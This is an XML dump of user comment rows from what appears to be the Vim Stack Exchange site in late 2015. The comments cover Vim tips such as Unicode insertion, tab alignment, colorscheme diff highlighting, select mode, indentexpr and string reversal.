  <row Id="7408" PostId="4839" Score="1" Text="@Peter Rinker thanks! ZoomWin make me happy. BTW last version 25: https://github.com/regedarek/ZoomWin I voted also here: http://stackoverflow.com/questions/13194428/is-better-way-to-zoom-windows-in-vim-than-zoomwin" CreationDate="2015-09-25T06:52:38.187" UserId="983" />
  <row Id="7409" PostId="4826" Score="0" Text="@statx: I adopted solution you suggest and voted the font at unix.stackexchange. My temporary conclusion: your  &quot;heavy&quot; solution is perfect for me, when I work mainly in a single big project (multiwin vim session) and occasionally I exit with :Q to edit something different. The possible mess (for me) of &quot;light&quot; solution is minimized with the prompt trick you suggested, thx! In case of multiple project (multiple windows for project session), maybe I prefer to manage different sessions (to store in the project home directory...)." CreationDate="2015-09-25T07:08:24.743" UserId="983" />
  <row Id="7410" PostId="4847" Score="0" Text="@muru Yes, it could do, I'll try, thanks." CreationDate="2015-09-25T08:21:00.357" UserId="467" />
  <row Id="7411" PostId="4855" Score="0" Text="How many keystrokes are you willing to dedicate? Since you're using Ubuntu, you can always use Unicode: Ctrl-Shift-u, then `7E` will give you `~`, Ctrl-Shift-u, then `60` will give you `\``." CreationDate="2015-09-25T08:48:39.490" UserId="205" />
  <row Id="7412" PostId="4854" Score="0" Text="You mean, like the `gj`/`gk` motion, or something else?" CreationDate="2015-09-25T09:28:49.370" UserId="205" />
  <row Id="7413" PostId="4855" Score="0" Text="thx, but It seems not working. plese note I use an headless ubuntu through a remote terminal (putty)..." CreationDate="2015-09-25T09:56:05.080" UserId="983" />
  <row Id="7414" PostId="4857" Score="0" Text="oooh, dumb me, I though that the `ends of a region` meant the &quot;closing pattern&quot; only. I didn't try this. Thanks a lot :)" CreationDate="2015-09-25T09:59:47.180" UserId="1821" />
  <row Id="7415" PostId="4857" Score="0" Text="You're welcome :) When you feel like knowing all this syntax stuff, perhaps write a blog post ;)" CreationDate="2015-09-25T10:02:00.380" UserId="1800" />
  <row Id="7416" PostId="4857" Score="1" Text="Definitely! At the first time I tried reading the `:h syntax`, but it got me confused pretty quickly, I also read [LVTHW syntax's section](http://learnvimscriptthehardway.stevelosh.com/chapters/45.html) but it doesn't cover all there is to do." CreationDate="2015-09-25T10:05:29.740" UserId="1821" />
  <row Id="7418" PostId="4855" Score="2" Text="Try from insert mode: `Ctrl-v u 007e`" CreationDate="2015-09-25T10:12:16.407" UserId="1800" />
  <row Id="7419" PostId="4855" Score="0" Text="@VanLaser yes it works! voted" CreationDate="2015-09-25T10:19:37.583" UserId="983" />
  <row Id="7420" PostId="4855" Score="0" Text="You can now use something like: `inoremap &lt;leader&gt;t &lt;C-v&gt;u007e`, &#xA;`inoremap &lt;leader&gt;' &lt;C-v&gt;u0060` etc. to create insert mode maps. Just search for the Unicode values for the special characters you want mapped, as @muru mentioned. *Note*: don't use those maps if your `&lt;leader&gt;` is `&lt;Space&gt;` :D" CreationDate="2015-09-25T10:24:07.850" UserId="1800" />
  <row Id="7421" PostId="4855" Score="2" Text="That can be expedited by looking at `man ascii` on Ubuntu." CreationDate="2015-09-25T10:25:01.633" UserId="205" />
  <row Id="7422" PostId="4855" Score="1" Text="@GiorgioRobino - what happens if you hit `AltGr ^` and `AltGr '` combos ? Reference: http://superuser.com/a/667654/292962" CreationDate="2015-09-25T10:30:49.110" UserId="1800" />
  <row Id="7423" PostId="4826" Score="1" Text="@GiorgioRobino: In case of multiple project you can still change a little bit my command to make it create the session file in the current working directory or you can make it [take a parameter](http://vimdoc.sourceforge.net/htmldoc/map.html#:command-nargs) to choose where you want to save your session. Then you only need to adjust you bash alias." CreationDate="2015-09-25T12:55:10.683" UserId="1841" />
  <row Id="7424" PostId="4861" Score="0" Text="How did you align your comments? Did you manually do it pressing `&lt;tab&gt;` and `&lt;space&gt;` to align these comments? Did you use something like [tabular](https://github.com/godlygeek/tabular) or [vim-easy-align](https://github.com/junegunn/vim-easy-align)?" CreationDate="2015-09-25T15:00:25.640" UserId="778" />
  <row Id="7425" PostId="4861" Score="0" Text="No it was all manual alignment with `&lt;tab&gt;` and possibly `&lt;space&gt;`" CreationDate="2015-09-25T15:02:40.603" UserId="4648" />
  <row Id="7426" PostId="4861" Score="3" Text="A &quot;standard&quot; tabstop setting is 8. If you use something else, you risk these sorts of display problems. You can `:set list` to see the tabs in Vim. You can set `tabstop` to 8 and `softtabstop` and `shiftwidth` to 4 and get the editing behavior you want while preserving compatibility with other programs such as `less`." CreationDate="2015-09-25T15:39:31.157" UserId="2055" />
  <row Id="7427" PostId="4852" Score="1" Text="One (less than ideal) option is to type it in vim, then copy it over." CreationDate="2015-09-25T17:01:46.723" UserId="2736" />
  <row Id="7428" PostId="4861" Score="1" Text="The other way: [set tab width for less output](http://unix.stackexchange.com/q/147443/70524)" CreationDate="2015-09-25T17:04:02.157" UserId="205" />
  <row Id="7429" PostId="4862" Score="3" Text="_You always want to use spaces for alignments._ - A more complete answer would begin with a phrase more or less like this: &quot;The world of programmers is divided in two big tribes: tab lovers, and tab haters.  They don't go along very well with each other&quot;. ;)" CreationDate="2015-09-25T17:55:26.370" UserId="1577" />
  <row Id="7430" PostId="4862" Score="1" Text="I agree there are different views on indention, but until [variable tab stops](https://groups.google.com/forum/#!topic/vim_dev/eNOQO06iRZQ) or [Elastic Tab stops](http://nickgravgaard.com/elastic-tabstops/) become a thing not just for Vim, but all text editors everywhere. I think the only real option is spaces for alignments. I mean its pretty simple you can mix tab indent + spaces for alignment or spaces everywhere. This will work on all editors no matter the settings or line lengths. But tabs for alignment!? Whoa! Slow down! You are going to get in trouble before you know it." CreationDate="2015-09-25T18:30:33.783" UserId="778" />
  <row Id="7431" PostId="4847" Score="0" Text="I believe this could be something similar to [this approach](http://vi.stackexchange.com/a/3302/467), but opposite (when string is not there, do something)." CreationDate="2015-09-25T20:35:36.330" UserId="467" />
  <row Id="7432" PostId="4868" Score="2" Text="`gn` is a surprisingly useful motion especially when combined with the `.` command. There is a nice [Vimcasts](http://vimcasts.org/) episode on the subject: [Operating on search matches using gn](http://vimcasts.org/episodes/operating-on-search-matches-using-gn/)" CreationDate="2015-09-25T21:35:18.110" UserId="778" />
  <row Id="7433" PostId="4864" Score="2" Text="Ooh! `+-` for tilde! In some contexts, a tilde indicates approximate information, and one could imagine `+-` as having a similar meaning." CreationDate="2015-09-26T01:42:23.437" UserId="205" />
  <row Id="7434" PostId="4848" Score="0" Text="Could &lt;ESC&gt;&lt;F7&gt; work?" CreationDate="2015-09-26T11:30:32.463" UserId="2965" />
  <row Id="7435" PostId="4848" Score="0" Text="@PeterRincker I agree, this would be better off as a command. I was just not familiar with he syntax of how to define one. Well, I will have to learn it. Thanks for the suggestion." CreationDate="2015-09-26T16:19:46.150" UserId="2865" />
  <row Id="7436" PostId="4854" Score="1" Text="By “paragraph”, do you mean sequences of non-empty lines? Or do you in fact mean lines? And by pages, do you mean screen pages, or sequences of characters other than form feed, or what?" CreationDate="2015-09-26T21:15:37.450" UserId="8" />
  <row Id="7437" PostId="4876" Score="1" Text="Ah ok I get it now. Thanks for the elementary explanation." CreationDate="2015-09-26T23:24:49.873" UserId="4656" />
  <row Id="7438" PostId="4849" Score="0" Text="@PeterRincker: It does work with `normal &lt;f7&gt;` on my system, thanks. Also maybe you should make it an answer since mine didn't satisfied OP." CreationDate="2015-09-27T00:37:11.997" UserId="1841" />
  <row Id="7439" PostId="4880" Score="1" Text="[pi-rho's PPA](https://launchpad.net/~pi-rho/+archive/ubuntu/dev) generally has very up-to-date packages." CreationDate="2015-09-27T08:24:32.477" UserId="205" />
  <row Id="7440" PostId="4880" Score="0" Text="@muru, agreed and recommended. That's the one I used when I was using Ubuntu." CreationDate="2015-09-27T08:27:23.117" UserId="54" />
  <row Id="7441" PostId="4883" Score="0" Text="Why don't you simply edit the colorscheme itself?" CreationDate="2015-09-27T11:07:28.340" UserId="54" />
  <row Id="7442" PostId="4883" Score="0" Text="I did it, as did the first user in the issue, but with no results. It's like the colorscheme overwrites the `Diff*`... (On the first line I've linked the issue.)" CreationDate="2015-09-27T11:08:59.237" UserId="4670" />
  <row Id="7443" PostId="4883" Score="0" Text="I'm confused. Why are there `\\` at the start of each line?" CreationDate="2015-09-27T11:38:53.267" UserId="205" />
  <row Id="7444" PostId="4883" Score="0" Text="@muru, `:help new-line-continuation`." CreationDate="2015-09-27T11:43:17.167" UserId="54" />
  <row Id="7445" PostId="4883" Score="0" Text="@romainl wow. That is horribly counter-intuitive when compared to other languages." CreationDate="2015-09-27T11:45:51.193" UserId="205" />
  <row Id="7446" PostId="4883" Score="0" Text="@muru, do you really expect vimscript to be intuitive?" CreationDate="2015-09-27T11:46:44.597" UserId="54" />
  <row Id="7447" PostId="4883" Score="0" Text="@romainl -_- indeed not. :D" CreationDate="2015-09-27T11:51:40.123" UserId="205" />
  <row Id="7448" PostId="4884" Score="1" Text="**Wow!!!** It did work! Where did you get the two commands `diffAdded` and `diffRemoved`? Let's say I'd like to change the bright green used after the `@@` with the theme's orange, how would I find that?" CreationDate="2015-09-27T11:53:47.677" UserId="4670" />
  <row Id="7449" PostId="4884" Score="1" Text="OK, found it [here](http://vim.wikia.com/wiki/Identify_the_syntax_highlighting_group_used_at_the_cursor). Now I'm in control! Uhahaha!" CreationDate="2015-09-27T12:21:55.060" UserId="4670" />
  <row Id="7450" PostId="4886" Score="0" Text="This is great! Thank you." CreationDate="2015-09-27T12:56:37.200" UserId="4668" />
  <row Id="7451" PostId="4879" Score="0" Text="I would like to accept this as the answer, but, when I asked the question, I was unregistered." CreationDate="2015-09-27T17:05:36.477" UserId="4675" />
  <row Id="7452" PostId="4854" Score="0" Text="I think you're talking about lines (as opposed to sentences). A paragraph is a different thing. Calling a very long line a paragraph is very confusing." CreationDate="2015-09-27T17:07:11.067" UserId="205" />
  <row Id="7453" PostId="4879" Score="0" Text="@AmagicalFishy if you registered with another email, you can merge the accounts." CreationDate="2015-09-27T17:08:40.080" UserId="205" />
  <row Id="7454" PostId="4879" Score="0" Text="I registered with the same e-mail, actually. I even got a notification that this answer was posted—but there's no accept-answer checkmark, for some reason." CreationDate="2015-09-27T17:22:07.447" UserId="4675" />
  <row Id="7455" PostId="4879" Score="0" Text="@AmagicalFishy at first glance, it seems there's nothing I can do as mod, sorry. You'll need to contact the Stack Exchange team, as given in http://vi.stackexchange.com/help/merging-accounts." CreationDate="2015-09-27T17:28:44.457" UserId="205" />
  <row Id="7456" PostId="4854" Score="0" Text="@muru: What thing is a paragraph then? It seems to me that a paragraph my well be regarded as a long broken line, as I indicated in my parenthesis." CreationDate="2015-09-27T20:35:28.230" UserId="4505" />
  <row Id="7457" PostId="4889" Score="1" Text="Oh I see. As the doc says first `This option controls the behavior when switching between buffers.` and only several lines later mentions quickfix commands and `sb` I thought that it was in addition of the regular buffer commands. Thanks!" CreationDate="2015-09-27T20:38:33.767" UserId="1841" />
  <row Id="7459" PostId="4891" Score="0" Text="To me, this sounds like what you'd expect from most GUI editors. (Selecting a line doesn't mean that it will go to a new line when pasting, shift+arrows extend it, typing replaces selection, all what I'd expect from, say, notepad)." CreationDate="2015-09-28T02:20:15.607" UserId="205" />
  <row Id="7460" PostId="4891" Score="0" Text="@muru: I agree that it reminds of this kind of editor but does it means that this mode would have been implemented just to please some users who would want to use Vim as a poor text editor? That seems pretty weird to me actually." CreationDate="2015-09-28T02:23:22.230" UserId="1841" />
  <row Id="7461" PostId="4891" Score="0" Text="actually, that pasting property is useful in some cases. I'm sure someone has posted a question about pasting like that here. And as for overwriting, that saves a keystroke (you don't have to press `c`), so depending on what you want to do, select mode could be useful. Pity I keep forgetting about it." CreationDate="2015-09-28T02:29:03.147" UserId="205" />
  <row Id="7462" PostId="4891" Score="0" Text="I'll try to find this question then. For the overwriting I don't really feel like the `c` is a saved keystroke because the selection is not as convenient as in visual mode (since you can't use `e` or `iw` directly)." CreationDate="2015-09-28T02:40:28.587" UserId="1841" />
  <row Id="7463" PostId="4891" Score="0" Text="Also, I think, but am not sure, that mouse selection used select mode." CreationDate="2015-09-28T02:51:53.820" UserId="205" />
  <row Id="7464" PostId="4891" Score="0" Text="You're right: when `'selectmode'` contains `mouse` and `'mouse'` contains a flag for the current mode, selecting with the mouse will start select-mode (according to the doc)." CreationDate="2015-09-28T02:54:18.917" UserId="1841" />
  <row Id="7465" PostId="4854" Score="0" Text="@Lawrence that's the literary paragraph, which is vague, and hence not very useful for programming an editor. Vim's notion of a paragraph is given in [`:h paragraph`](http://vimhelp.appspot.com/motion.txt.html#paragraph) (essentially a block of text demarcated by blank lines)." CreationDate="2015-09-28T07:27:50.593" UserId="205" />
  <row Id="7466" PostId="4854" Score="1" Text="does this answer your question? http://stackoverflow.com/questions/15124386/gvim-what-do-the-symbols-mean-at-the-bottom-left-of-the-screen/15124555#15124555" CreationDate="2015-09-28T08:43:39.363" UserId="1569" />
  <row Id="7467" PostId="4893" Score="0" Text="Did you try to separate `set ft=mkd` and `set ft=mkd.markdown`?" CreationDate="2015-09-28T09:46:35.513" UserId="54" />
  <row Id="7468" PostId="4893" Score="0" Text="@romainl I don't understand: separate how? Add another `set ft` line? The file: https://github.com/plasticboy/vim-markdown/blob/master/ftdetect/markdown.vim#L2" CreationDate="2015-09-28T09:48:34.287" UserId="2038" />
  <row Id="7469" PostId="4893" Score="0" Text="No, both on the same line so that there's an &quot;mkd&quot; event triggered before the &quot;mkd.markdown&quot; event." CreationDate="2015-09-28T10:18:45.007" UserId="54" />
  <row Id="7470" PostId="4893" Score="0" Text="@romainl `set ft=mkd || set ft=mkd.markdown`in ftdetect seems to work, but when I open a markdown file it echos an empty line and requires me to press enter, not sure why. But that is a bit ugly, specially I'd also have to add a `set ft=markdown` to make it work for users who update to the new filetype." CreationDate="2015-09-28T10:52:03.890" UserId="2038" />
  <row Id="7471" PostId="4855" Score="0" Text="@Vanlaser nothing happens :-(" CreationDate="2015-09-28T13:19:52.047" UserId="983" />
  <row Id="7472" PostId="4855" Score="0" Text="Instead digraphs solution works. thx @8bittree" CreationDate="2015-09-28T13:19:59.347" UserId="983" />
  <row Id="7473" PostId="4892" Score="0" Text="I think it is pretty surprising to port Vim on Windows and to create this kind of mode to please the users: If they wanted a &quot;classical&quot; editor why would they use Vim then? But it seems to be the only explaination so... Also I don't really understand the profit of your mappings: as far as I understand they select the word under the cursor in select mode, once you've done that why is it useful?" CreationDate="2015-09-28T13:31:54.717" UserId="1841" />
  <row Id="7474" PostId="4892" Score="0" Text="Once the word is selected, type something then press `§` to select the next occurrence, type something else then press `§` again to select the next occurrence, and so on. You can press `.` to repeat the last insertion. It's a variant of &quot;the dot formula&quot;." CreationDate="2015-09-28T14:14:08.953" UserId="54" />
  <row Id="7475" PostId="4892" Score="0" Text="Oh I see. Nice trick :-)" CreationDate="2015-09-28T14:19:13.600" UserId="1841" />
  <row Id="7476" PostId="4897" Score="0" Text="This is a possible workaround, but a bit ugly as it loses match specificity ;-)" CreationDate="2015-09-28T14:55:41.223" UserId="2038" />
  <row Id="7477" PostId="4897" Score="0" Text="How many filetypes do you know, that contain the string markdown?" CreationDate="2015-09-28T14:56:42.457" UserId="71" />
  <row Id="7478" PostId="4897" Score="0" Text="Yes, not likely a problem for markdown :-)" CreationDate="2015-09-28T14:58:04.680" UserId="2038" />
  <row Id="7479" PostId="4887" Score="0" Text="Thanks, this is great,  Christian.     One question:   I can't seem to find an example in which the addition of the exclamation point after norm is actually necessary.       It doesn't appear to be in this case.    Could you give me an example please?" CreationDate="2015-09-28T15:21:57.767" UserId="4667" />
  <row Id="7480" PostId="4887" Score="0" Text="Well, using `:norm!` rather than `:norm` protects you from mappings the user might have. For example, you don't know what the normal mode key d will be mapped to and this would break your `:g` command, if the keys work differently. Therefore use the `:norm!` command, so that mappings never will be taken into acount." CreationDate="2015-09-28T15:26:16.383" UserId="71" />
  <row Id="7481" PostId="4903" Score="0" Text="Fabulous!   Thanks" CreationDate="2015-09-29T01:12:48.887" UserId="4667" />
  <row Id="7482" PostId="4896" Score="0" Text="The problem with `smartcase` is that it is also a global option." CreationDate="2015-09-29T02:43:50.230" UserId="985" />
  <row Id="7483" PostId="4896" Score="0" Text="Yes and a buffer/window local option smartcase wouldn't make sense. I fail to see, why this is a problem however" CreationDate="2015-09-29T05:58:31.773" UserId="71" />
  <row Id="7484" PostId="4902" Score="0" Text="You can use the LogiPat plugin that is distributed with newer Vims" CreationDate="2015-09-29T06:02:09.393" UserId="71" />
  <row Id="7485" PostId="4896" Score="0" Text="Yes, you're right!" CreationDate="2015-09-29T07:54:07.390" UserId="985" />
  <row Id="7486" PostId="4914" Score="1" Text="`&quot;0p` or `&lt;C-r&gt;0` use the last yank so you can cut whatever you want in the mean time and keep the ability to put the last yank." CreationDate="2015-09-29T14:56:03.923" UserId="54" />
  <row Id="7487" PostId="4914" Score="0" Text="hed-palm! Thank you! Can't believe I missed that. Add it as an answer and I'll mark it as accepted." CreationDate="2015-09-29T14:57:02.057" UserId="544" />
  <row Id="7488" PostId="4913" Score="0" Text="To make your answer useful for other users you should detail what your commands are doing. And also maybe check that they work properly (I haven't tested it myself)." CreationDate="2015-09-29T15:41:12.713" UserId="1841" />
  <row Id="7489" PostId="4913" Score="0" Text="@statox , thank you for the suggestion: lets do it!" CreationDate="2015-09-29T16:47:32.477" UserId="3002" />
  <row Id="7490" PostId="4913" Score="0" Text="thanks for your update :-)" CreationDate="2015-09-29T16:52:09.600" UserId="1841" />
  <row Id="7491" PostId="4923" Score="0" Text="great thanks for the answer. I get all what you are saying. Its pretty much straight from the docs. However I don't think I even need to indent to get `v:lnum` value. I get it without indenting ! The question is why I can't get `v:lnum` equals to one..? it is either `0` or `&gt;= 2`..? And I'm not sure what you mean by &quot;minor bug&quot;..?" CreationDate="2015-09-30T06:31:48.243" UserId="4700" />
  <row Id="7492" PostId="4923" Score="0" Text="You are setting the indentexpr for the buffer and when inserting new lines, Vim will internally call the indentexpr to determine the indent and init v:lnum to each line number, leaving v:lnum with the last line number of your buffer." CreationDate="2015-09-30T06:52:06.883" UserId="71" />
  <row Id="7493" PostId="4923" Score="0" Text="so why can't I get `v:lnum` equal to `1` once I typed in one line..? When I do that `v:lnum` equals to `0`. If I type second line `v:lnum` equals to `2` Where is `1` ..?" CreationDate="2015-09-30T06:57:23.947" UserId="4700" />
  <row Id="7494" PostId="4923" Score="0" Text="Because it depends on the number of lines your buffer has. So it will be 1, if you have a buffer with a single line and call the indentexpr function (e.g. using &quot;V=&quot; in a buffer with a single line)" CreationDate="2015-09-30T07:04:30.197" UserId="71" />
  <row Id="7495" PostId="4923" Score="0" Text="sorry, can you spell it out for me. I don't get it how to call the indentexpr function.. I thought `:call Check()` is calling `indentexpr` since `:set indentexpr?` equals to `indentexpr=Check()`... What is this `V=` thing.. ?&#xA;Once I typed single line in I `:buffers` and here is output `:buffers                                                                                                               &#xA;  1 %a + &quot;[No Name]&quot;                    line 1` and `call Check()` is `0`" CreationDate="2015-09-30T07:15:38.377" UserId="4700" />
  <row Id="7496" PostId="4923" Score="0" Text="Just because you set the indentexpr() does not mean it will be magically used when calling the function. It will be used, whenever you want to indent a line, e.g. using '=' read the help at `:h =`" CreationDate="2015-09-30T07:18:52.673" UserId="71" />
  <row Id="7497" PostId="4923" Score="0" Text="hah I got it now.. Nice . thanks for help" CreationDate="2015-09-30T07:33:28.737" UserId="4700" />
  <row Id="7498" PostId="4817" Score="1" Text="I also use history for this: ctrl-r &quot;vim&quot;, which previews the command and allows refining the search (or continue backwards with repeated ctrl-r)." CreationDate="2015-09-30T10:22:11.357" UserId="4707" />
  <row Id="7499" PostId="4915" Score="0" Text="This is like using a ballistic missile to kill a mouse.  Vim has builtin support for abbreviations." CreationDate="2015-09-30T12:06:16.193" UserId="2313" />
  <row Id="7500" PostId="4915" Score="0" Text="No harm done when you atleast know that you kill a mouse a by that :)" CreationDate="2015-09-30T12:14:48.040" UserId="4696" />
  <row Id="7503" PostId="4929" Score="0" Text="Looks like this question: https://stackoverflow.com/questions/25018843/gvim-redraw-issues-with-virtual-box-and-windows-7-host/32468637#32468637" CreationDate="2015-09-30T14:26:08.883" UserId="71" />
  <row Id="7504" PostId="4929" Score="0" Text="Problem is similar or same. I do not use compiz and using Mate.  The sync issues does not happen with any other apps" CreationDate="2015-09-30T14:40:41.947" UserId="4709" />
  <row Id="7505" PostId="4929" Score="0" Text="Yes, for the record the Issue its issue 91 on the bug tracker, it sounds like a graphics driver bug,  but I don't know of any real solution to this problem." CreationDate="2015-09-30T14:47:35.870" UserId="71" />
  <row Id="7506" PostId="4929" Score="0" Text="Could this be mitigated with, say a better graphics card or is it in the guts of the software between Windows and Linux ? I am still using the native Intel graphics driver with motherboard that came with i7 processor" CreationDate="2015-09-30T14:55:49.513" UserId="4709" />
  <row Id="7507" PostId="4929" Score="0" Text="I honestly don't know." CreationDate="2015-09-30T14:57:12.853" UserId="71" />
  <row Id="7508" PostId="4917" Score="0" Text="very cool! (+1)" CreationDate="2015-09-30T15:33:35.523" UserId="3002" />
  <row Id="7509" PostId="4709" Score="0" Text="@statox et al, It would be wonderful if you guys  could &quot;answer&quot; an example of a syntax in both formats..." CreationDate="2015-09-30T16:12:07.283" UserId="3002" />
  <row Id="7510" PostId="4874" Score="0" Text="Another option: [YouCompleteMe](https://github.com/Valloric/YouCompleteMe), which uses `Jedi` (for python) and replaces the `SuperTab` functionality." CreationDate="2015-09-30T16:27:11.907" UserId="2303" />
  <row Id="7512" PostId="4899" Score="0" Text="Thanks, @statox, unfortunately I oversimplified the example.  Your answer relied on more structure than is generally available for my case.  If you could help me solve this example, maybe I could get what I need:     ( a b ) &#xA;( b ) a ( b )     I want to change the first a to A but not the second.  I can modify your suggestion, but it changes both expressions because in the second line, a is still between two delimiters.   The difference is that in the second expression the left delimiter is matched, *then* the a occurs, then a new delimiter is opened" CreationDate="2015-09-30T19:06:31.413" UserId="4667" />
  <row Id="7513" PostId="4927" Score="0" Text="Great! To the point and complete. Really helpful!" CreationDate="2015-09-30T19:23:57.207" UserId="4708" />
  <row Id="7514" PostId="4760" Score="1" Text="Solution: there were some clang-related files in `.vim/plugin`. I don't know how they got there, but deleting `plugin` solved the problem." CreationDate="2015-09-30T20:17:21.067" UserId="4589" />
  <row Id="7515" PostId="4899" Score="0" Text="@LeoSimon: I think you should edit your question to provide some real examples so that we can see what you really want to do. Also I'm not the best with regexes so maybe someone will be able to find a better solution with an example :-)" CreationDate="2015-09-30T22:39:31.930" UserId="1841" />
  <row Id="7516" PostId="4899" Score="0" Text="I find it *really* hard to write anything complex as a comment;  (the instructions on using mini-markdown formatting are too terse for me to understand) so I've posted the question, with real examples as a new thread, [link]http://vi.stackexchange.com/questions/4938/distinguish-between-patterns-that-are-inside-open-delimters-and-those-that-are-n[\link]" CreationDate="2015-10-01T02:44:45.593" UserId="4667" />
  <row Id="7517" PostId="4899" Score="0" Text="@LeoSimon Okay. Actually that's what the `edit` button under your question is for: You can click it and modify your question to append some informations which could be useful. That's why the comments are not convenient to write complexes explications :-) If you created a new question try not to make a duplicate of this one. I'll give a look a your new question and see if I can find an answer." CreationDate="2015-10-01T03:49:31.467" UserId="1841" />
  <row Id="7518" PostId="4942" Score="1" Text="I voted your proposal too, but I stll prefer the &quot;sessions&quot; heavy solution&quot;." CreationDate="2015-10-01T11:25:37.850" UserId="983" />
  <row Id="7519" PostId="4941" Score="0" Text="Huh, I kept scanning through the whole `:h filetype` page and searching for different terms w/o finding it." CreationDate="2015-10-01T14:15:29.630" UserId="824" />
  <row Id="7520" PostId="4944" Score="0" Text="It depends on what you mean by &quot;elegant&quot;.  There is no internal function dedicated to reversing a string, if that's what you're asking.  If you mean doing it with two or less calls to internal functions and no additional statements, that doesn't seem to be possible, either." CreationDate="2015-10-01T14:17:53.170" UserId="2313" />
  <row Id="7521" PostId="4944" Score="0" Text="Your current solution is already both elegant *and* idiomatic." CreationDate="2015-10-01T14:27:09.973" UserId="54" />
  <row Id="7522" PostId="4944" Score="0" Text="@Soto Yes, that's what I understand by elegant." CreationDate="2015-10-01T14:27:20.213" UserId="985" />
  <row Id="7523" PostId="4847" Score="0" Text="`ex ~/.bashrc -c &quot;if search('export PATH=\~\/.composer\/vendor\/bin:\$PATH')&gt;0 | norm quit | endif | norm Aexport PATH=~/.composer/vendor/bin:$PATH&quot;`" CreationDate="2015-10-01T14:33:18.243" UserId="1145" />
  <row Id="7524" PostId="4941" Score="0" Text="@MuMind: the single quotes are significant. You get different pages with `:h filetype` and `:h 'filetype'`." CreationDate="2015-10-01T14:38:20.427" UserId="2942" />
  <row Id="7525" PostId="4944" Score="0" Text="Skip the '.' in the split part." CreationDate="2015-10-01T14:39:19.143" UserId="71" />
  <row Id="7527" PostId="4944" Score="0" Text="@ChristianBrabandt That works, but it's slightly less efficient than the OP's approach.  Here's why: `:echo split('abc', '\zs', 1)`." CreationDate="2015-10-01T14:46:03.213" UserId="2313" />
  <row Id="7528" PostId="4944" Score="0" Text="@SatoKatsura actually, I think it is more efficient, because the regexp engine does not need to match anything. Furthermore, this is the prefered way from the documentation." CreationDate="2015-10-01T14:55:59.363" UserId="71" />
  <row Id="7529" PostId="4944" Score="0" Text="@ChristianBrabandt But then `split()` has to do more work, by removing the empty items.  And BTW, `split()` is still broken at the moment, right? ;)" CreationDate="2015-10-01T15:01:53.640" UserId="2313" />
  <row Id="7530" PostId="4944" Score="0" Text="What do you mean with broken?" CreationDate="2015-10-01T15:03:19.243" UserId="71" />
  <row Id="7531" PostId="4944" Score="1" Text="@ChristianBrabandt According to the manual, `split()` without the `{keepempty}` option should remove a single empty item at the beginning, and a single empty item at the end.  It currently removes all empty items, including the ones in the middle of the list (which is more useful than the documented behaviour if you ask me, but you probably aren't).  I think this has been discussed recently on `vim_dev`." CreationDate="2015-10-01T15:08:07.063" UserId="2313" />
  <row Id="7532" PostId="4945" Score="3" Text="http://ell.stackexchange.com/questions/14632/why-does-yank-in-vim-mean-copy" CreationDate="2015-10-01T15:38:16.233" UserId="54" />
  <row Id="7534" PostId="4950" Score="0" Text="This seems to work, indeed. I am a bit shocked, though, that vim doesn't have an internal command to do that. I mean, it's a text editor, is it not?" CreationDate="2015-10-01T15:58:15.560" UserId="985" />
  <row Id="7535" PostId="4947" Score="0" Text="FWIW, `:help string-functions` and `:help list-functions`." CreationDate="2015-10-01T16:00:49.550" UserId="54" />
  <row Id="7536" PostId="4950" Score="1" Text="@RenéNyffenegger You can look at it like this: Vim runs on Commodore Amiga, BeOS, VMS, and ~10 other OSes; most of those systems don't even support multi-byte characters. ;) Or like this: the Vim project has started in 1991, basic support for UTF-8 was added in version 6, and functions dealing with wide characters have been added in version 7 (about 2010)." CreationDate="2015-10-01T16:11:00.133" UserId="2313" />
  <row Id="7537" PostId="4944" Score="0" Text="@SatoKatsura yeah I didn't follow the discussion on vim_dev closely, but I think it was agreed to fix the documentation." CreationDate="2015-10-01T16:25:10.367" UserId="71" />
  <row Id="7538" PostId="4951" Score="0" Text="what is your vimrc configuration for  NERDTree and CtrlP." CreationDate="2015-10-01T16:53:47.833" UserId="1691" />
  <row Id="7539" PostId="4951" Score="0" Text="Updated question" CreationDate="2015-10-01T17:14:26.720" UserId="4722" />
  <row Id="7540" PostId="4941" Score="1" Text="@PeterLewerin Yep, I know. `:h filetype` is the large in-depth doc where I expected to find details." CreationDate="2015-10-01T18:11:07.013" UserId="824" />
  <row Id="7541" PostId="4950" Score="0" Text="@RenéNyffenegger That has been discussed extensively on vim_dev. The problem is, there is no backward compatible way, so it's how it is." CreationDate="2015-10-01T19:15:03.513" UserId="71" />
  <row Id="7542" PostId="4945" Score="1" Text="In [Bill Joy's original vi reference](http://docs.freebsd.org/44doc/usd/12.vi/paper-4.html#section23), `y` is described as *&quot;yank operator, for copies and moves&quot;*. As mentioned in romainl's link, the reason that *yank* was chosen is probably because the `y` key was free." CreationDate="2015-10-01T21:04:21.217" UserId="51" />
  <row Id="7544" PostId="4948" Score="0" Text="Miraculous, thanks so much.     That's amazingly powerful.    I needed install vim.gtk on my ubuntu machine to get perl support.    Is there any reason *not* to use vim.gtk as my default editor?" CreationDate="2015-10-01T23:18:12.543" UserId="4667" />
  <row Id="7546" PostId="4954" Score="1" Text="What distribution are you using? Debian/Ubuntu?" CreationDate="2015-10-02T07:46:25.960" UserId="71" />
  <row Id="7547" PostId="4954" Score="2" Text="If your `ex` is provided by Vim, it should have Perl support. On Arch Linux, `ex` is provided by `vi` (that's the BSD `vi`), so it has no support for anything. Worst case, you can always do `vim -Nes` to use `vim` as `ex`." CreationDate="2015-10-02T08:09:49.217" UserId="205" />
  <row Id="7548" PostId="4956" Score="0" Text="Does cscope support other languages than C/C++ and Java ?" CreationDate="2015-10-02T10:42:25.270" UserId="1543" />
  <row Id="7549" PostId="4957" Score="0" Text="Does cscope support other languages than C/C++ and Java ?" CreationDate="2015-10-02T10:42:29.630" UserId="1543" />
  <row Id="7550" PostId="4956" Score="0" Text="Yes, at least PHP and JavaScript." CreationDate="2015-10-02T11:20:50.873" UserId="54" />
  <row Id="7551" PostId="4959" Score="0" Text="What do you expect to see?" CreationDate="2015-10-02T11:26:28.143" UserId="54" />
  <row Id="7552" PostId="4959" Score="0" Text="Thank you for your reply! Not a box, i expect to see a &quot;-&quot; or another meaningful symbol." CreationDate="2015-10-02T11:30:46.753" UserId="4730" />
  <row Id="7553" PostId="4959" Score="0" Text="The first character is defined with the `showbreak` option and the last one is defined with `listchars`. See `:help 'showbreak'` and `:help listchars'`. What is the output of `:set encoding`?" CreationDate="2015-10-02T12:14:53.720" UserId="54" />
